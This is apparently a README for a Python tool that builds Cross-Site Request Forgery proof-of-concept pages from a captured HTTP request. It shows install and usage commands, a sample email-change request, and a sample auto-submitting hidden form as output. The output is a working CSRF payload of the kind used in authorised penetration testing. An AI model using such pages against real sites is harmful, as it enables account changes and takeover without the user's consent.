# CSRF Proof Of Concept Generator
The script can generate the proof of concept for Cross-Site Request Forgery vulnerability. Script recognizes GET and POST methods and request parameters. This script works similar to `CSRF PoC Generator` in `Burp Suite Professional`.

# Installation
```
git clone https://github.com/sz7mon/CSRF_PoC_Generator
```
```
cd CSRF_PoC_Generator
```
```
pip3 install -r requirements.txt
```
# Usage
```
python3 csrf_poc.py <request_file>
```
***
### Example Request File
```
POST /my-account/change-email HTTP/1.1
Host: localhost
Cookie: session=QGKPUjL6KfwAzAatWSrl40aGrgpDxT9a
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Connection: close

email=test%40test.com&csrf=YFm7wFHwvaAjXVtCLc7u6kI4BFeszoZu
```
***
### Example Output File
```
<html>
<body>
<form action="https://localhost/my-account/change-email" method="POST">

<input type="hidden" name="email" value="test@test.com" />

<input type="hidden" name="csrf" value="YFm7wFHwvaAjXVtCLc7u6kI4BFeszoZu" />

</form>
<script>
document.forms[0].submit();
</script>
</body>
</html> 
```
